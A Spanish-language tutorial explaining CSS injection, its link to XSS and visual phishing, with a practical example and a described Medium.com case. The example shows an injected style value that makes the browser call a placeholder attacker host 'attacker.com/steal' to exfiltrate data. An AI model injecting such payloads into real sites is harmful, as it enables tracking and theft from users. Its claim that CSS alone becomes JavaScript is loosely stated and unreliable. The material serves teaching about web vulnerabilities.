# Inyecciones CSS (CSSI)

Las Inyecciones CSS (CSSI) son un tipo de vulnerabilidad web que permite a un atacante inyectar código CSS malicioso en una página web. Esto ocurre cuando una aplicación web confía en entradas no confiables del usuario y las utiliza directamente en su código CSS, sin realizar una validación adecuada.

El código CSS malicioso inyectado puede alterar el estilo y diseño de la página, permitiendo a los atacantes realizar acciones como la suplantación de identidad o el robo de información confidencial.

Las Inyecciones CSS (CSSI) pueden ser utilizadas por los atacantes como un vector de ataque para explotar vulnerabilidades de Cross-Site Scripting (XSS). Imaginemos que una aplicación web permite a los usuarios introducir texto en un campo de entrada que se muestra en una página web. Si el desarrollador de la aplicación no valida y filtra adecuadamente el texto introducido por el usuario, un atacante podría inyectar código malicioso en el campo de entrada, incluyendo código CSS e incluso JavaScript.

Si el código CSS inyectado es lo suficientemente complejo, puede hacer que el navegador web interprete el código como si fuera JavaScript. Esto se conoce como una inyección de JavaScript inducida por CSS (CSS-Induced JavaScript Injection).

Una vez que el código JavaScript ha sido inyectado en la página, este puede ser utilizado por el atacante para realizar un ataque de Cross-Site Scripting (XSS). A partir de este punto, el atacante podría inyectar un script malicioso que robe las credenciales del usuario o redirija a la víctima a una página web falsa, entre otros vectores.

## Ejemplo práctico

Supongamos que estamos ante una aplicación web que permite personalizar el color del nombre de usuario en el perfil, y este valor es reflejado directamente en el HTML sin sanitización:

```html
<div style="color: [COLOR]">metahumo</div>
```

Si introducimos un valor como:

```
blue; background:url('http://attacker.com/steal')
```

El navegador interpretará:

```html
<div style="color: blue; background:url('http://attacker.com/steal')">metahumo</div>
```

Esto provocará una solicitud al dominio del atacante, permitiéndole rastrear actividad o exfiltrar información sensible.

## Caso real

En 2018 se descubrió una vulnerabilidad en el servicio de blogs Medium.com. El fallo consistía en que Medium permitía incrustar estilos CSS personalizados sin suficiente filtrado. Esto permitió a los atacantes inyectar código CSS para modificar completamente la apariencia de artículos y páginas de usuario. Aprovechando pseudoelementos CSS como `::before` y `content`, y combinaciones con `attr()`, los atacantes podían realizar ataques de phishing visual, mostrando formularios falsos en el sitio legítimo.

Este tipo de ataque evidencia cómo una simple vulnerabilidad de inyección CSS puede convertirse en un riesgo crítico si no se aplican medidas adecuadas de validación y sanitización del input del usuario.